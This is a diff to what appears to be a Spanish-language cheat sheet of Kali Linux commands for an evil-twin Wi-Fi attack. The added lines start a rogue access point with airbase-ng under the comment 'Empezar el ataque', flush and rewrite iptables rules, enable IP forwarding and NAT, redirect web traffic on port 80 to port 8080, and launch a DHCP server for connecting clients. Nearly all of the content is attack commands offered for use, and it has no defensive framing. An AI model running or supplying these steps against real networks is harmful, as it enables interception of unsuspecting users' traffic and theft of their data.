@@ -2,7 +2,29 @@
   root@kali:~# airmon-ng start wlan0
   
 ---------------------
+
 #activar el modo monitor
   root@kali:~# airmon-ng check kill
-  
+
 ----------------------
+
+#Empezar el ataque
+  root@kali:~# airbase-ng -e "bssid" -v wlan0mon
+
+----------------------
+
+root@kali:~# iptables --flush
+root@kali:~# iptables --table nat --flush
+root@kali:~# iptables --delete-chain
+root@kali:~# iptables --table nat --delete-chain
+root@kali:~# echo 1> /proc/sys/net/ipv4/ip_forward
+root@kali:~# ifconfig at0 up
+root@kali:~# ifconfig at0 192.168.1.** netmask 255.255.255.0
+root@kali:~# route add -net 192.168.1.** netmask 255.255.255.0 gw 192.168.1.**
+root@kali:~# iptables -P FORWARD ACCEPT
+root@kali:~# iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+root@kali:~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to port 8080
+
+----------------------------------------
+
+  root@kali:~# dhcp -cf /root/dhcp.conf -f -d 
